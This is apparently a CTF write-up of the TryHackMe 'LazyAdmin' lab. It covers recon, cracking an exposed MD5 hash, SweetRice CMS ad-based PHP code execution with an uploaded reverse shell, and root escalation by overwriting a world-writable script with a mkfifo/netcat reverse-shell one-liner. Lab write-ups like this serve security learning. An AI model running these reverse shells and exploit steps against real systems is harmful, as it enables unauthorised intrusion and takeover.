- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Scenario

Have some fun! There might be multiple ways to get user access.
# Recon
## Nmap

We add the host in /etc/hosts (lazy.thm) and scan with [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md):

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
└─$ nmap  -A  10.10.205.167   

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15

```

# Enumeration
## HTTP (80)

### Gobuster

We start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on port 80 with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://lazy.thm


/.hta                 (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/content              (Status: 301) [Size: 306] [--> http://lazy.thm/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 273]

```

Enumerating /content :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://lazy.thm/content
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lazy.thm/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/_themes              (Status: 301) [Size: 314] [--> http://lazy.thm/content/_themes/]
/as                   (Status: 301) [Size: 309] [--> http://lazy.thm/content/as/]
/attachment           (Status: 301) [Size: 317] [--> http://lazy.thm/content/attachment/]
/images               (Status: 301) [Size: 313] [--> http://lazy.thm/content/images/]
/inc                  (Status: 301) [Size: 310] [--> http://lazy.thm/content/inc/]
/index.php            (Status: 200) [Size: 2194]
/js                   (Status: 301) [Size: 309] [--> http://lazy.thm/content/js/]
Progress: 4746 / 4747 (99.98%)

```

### Webpage

We try go to /content [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) :

<img src="../../Flameshots/f623c76a81666fa5f6d8a33a9e016b99.png" alt="f623c76a81666fa5f6d8a33a9e016b99.png" width="443" height="328" class="jop-noMdConv">

and to /content/inc :

<img src="../../Flameshots/ee4ee05dba2cca11f08d07877e8db3fa.png" alt="ee4ee05dba2cca11f08d07877e8db3fa.png" width="422" height="204" class="jop-noMdConv">

We find a username and a hashed password in the file :

<img src="../../Flameshots/c45c876f60ee44853aa419e6dea9f2c7.png" alt="c45c876f60ee44853aa419e6dea9f2c7.png" width="817" height="94" class="jop-noMdConv">

manager : **42f749ade7f9e195bf475f37a44cafcb**

### Hashcat

You might recognise that hash format as being [MD5](../../3%20-%20Tags/Hacking%20Concepts/MD5.md). We use [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) with the rockyou wordlist and crack it :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
└─$ hashcat -m0 -a0 --force -o cracked.txt  '42f749ade7f9e195bf475f37a44cafcb' /usr/share/wordlists/rockyou.txt


┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
└─$ cat cracked.txt 
42f749ade7f9e195bf475f37a44cafcb:Password123

```

And we have the password : **Password123**

If we go to the content/as directory we have a login page :

<img src="../../Flameshots/33f2c5208973a53f82c2157c109edbb6.png" alt="33f2c5208973a53f82c2157c109edbb6.png" width="310" height="304" class="jop-noMdConv">

Let's enter the cracked credentials :

<img src="../../Flameshots/4ddc3e6bfc381f1197580361880037e2.png" alt="4ddc3e6bfc381f1197580361880037e2.png" width="625" height="427" class="jop-noMdConv">

# Exploit

## Searchsploit

We search for SweetRice with [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) :

<img src="../../Flameshots/de9f017b9d8cbe6fdd8faeb9d3586a35.png" alt="de9f017b9d8cbe6fdd8faeb9d3586a35.png" width="472" height="203" class="jop-noMdConv">

There are two vulnerabilities that could be applied here:

1.  The Arbitrary File Upload .
2.  The **PHP Code Execution**, which, if you have a look at it, allows you to add PHP code as an advert then activate it through the `/inc` folder:

Let's try it , we copy to our working dir and cat it :

```
# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo();
Code You Can
Customize Exploit For Your Self .

```

So we go in Ads and upload the PentestMonkey [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md)but first we modify our [IP address](../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) :

<img src="../../Flameshots/2e68cc6ef240c5105612418ee0debcde.png" alt="2e68cc6ef240c5105612418ee0debcde.png" width="296" height="163" class="jop-noMdConv">

We copy paste the text in the Ads prompt and upload it :

<img src="../../Flameshots/d15c7ba3fcbfaca58b485d34e9a7833c.png" alt="d15c7ba3fcbfaca58b485d34e9a7833c.png" width="571" height="203" class="jop-noMdConv">

## Netcat

We can then activate the [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) by going to `http://lazy.thm/content/inc/ads/Rev_Shell`, but first we need to setup a [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener by using the bash command:

```
nc -lvnp 1234
```

This gives the reverse shell something to connect back to.

<img src="../../Flameshots/3e3eb8cb1fbe2e85c52b7871c73beae2.png" alt="3e3eb8cb1fbe2e85c52b7871c73beae2.png" width="314" height="135" class="jop-noMdConv">

And once we click it we have it :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
└─$ nc -lvnp 1234 
listening on [any] 1234 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.205.167] 42568
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux                                                                                       
 18:32:12 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}

```

# Privilege Escalation

We start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) checking for sudo -l :

```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

```

and checking the [Script](../../3%20-%20Tags/Hacking%20Concepts/Script.md) we see that it is running system (‘sh’,’/etc/copy.sh’) and checking the permission of `/etc/copy.sh` we see we can modify that so we do for a revshell ;

```
$ cd /etc/
$ ls -lah | grep copy.sh
-rw-r--rwx   1 root root     81 Nov 29 13:45 copy.sh
$ cat copy.sh	
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.162.183 5554 >/tmp/f' >/etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl

```

And we **[Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md)** to have a root [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) , we can cat the root flag :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/LazyAdmin]
└─$ nc -lvnp 5554
listening on [any] 5554 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.205.167] 33370
/bin/sh: 0: can't access tty; job control turned off
# cd root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}

```

Pwned !!
